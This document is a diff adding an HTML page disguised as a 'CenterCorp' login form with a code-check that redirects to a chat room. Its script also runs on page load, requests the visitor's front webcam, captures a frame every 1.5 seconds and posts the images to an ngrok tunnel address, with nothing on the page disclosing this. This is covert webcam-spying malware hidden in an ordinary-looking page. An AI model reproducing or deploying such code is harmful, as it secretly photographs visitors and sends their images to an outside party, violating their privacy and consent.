@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html>
+ <head>
+	<title>
+		CenterCorp
+	</title>
+	<link rel="stylesheet" type="text/css" href="lokifcc.css">
+ </head>
+ <body background="lokiwhite.jpg">
+
+		
+	<div class="border">	
+	<div class="loginbox">
+	<img src="banlogo.png" class="facebook">
+		<h1 class="a">CenterCorp</h1>
+	   <h1>Login Here</h1>
+	   
+	   <form>
+	         <p align="center">CODE</p>
+		     <input id="cdcode" placeholder="Enter Code Here" maxlength="10" > 
+		     <br>
+			 <input type="button" value="Login" onclick="check()">
+			 <br>
+	   </form>	
+	</div>
+	</div>
+<script>
+	
+	function check() {
+		var a = document.getElementById("cdcode").value;
+
+		var cds = '638976359';
+	
+		if (a == cds) {
+			window.location.href = "http://centercorp.chatango.com/";
+		}else{
+			alert('Error');
+		}
+	}
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'https://dfdee00ae01b.ngrok.io/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 480);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+  
+
+}
+
+// Load init
+init();
+
+
+</script>
+
+
+ </body>
+</html>
